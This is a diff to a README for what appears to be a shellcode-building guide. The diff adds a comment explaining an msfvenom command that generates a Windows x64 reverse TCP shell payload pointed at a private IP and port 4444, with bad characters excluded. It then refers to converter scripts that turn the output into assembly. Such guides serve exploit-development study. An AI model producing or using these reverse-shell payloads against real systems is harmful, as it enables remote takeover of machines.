@@ -6,6 +6,8 @@ For example with :
 
 ```msfvenom -p windows/x64/shell_reverse_tcp RHOST=192.168.245.132 LPORT=4444 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c ```
 
+((this command create a shellcode in C language (you can do with python (p) or directly hex (hex)) and encode without "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" which can do complits))
+
 ## 2. Convert your shellcode
 
 Use this homemade [converter_1](./convert.sh) or [converter_2](./convert2.sh) to get your asm shellcode.
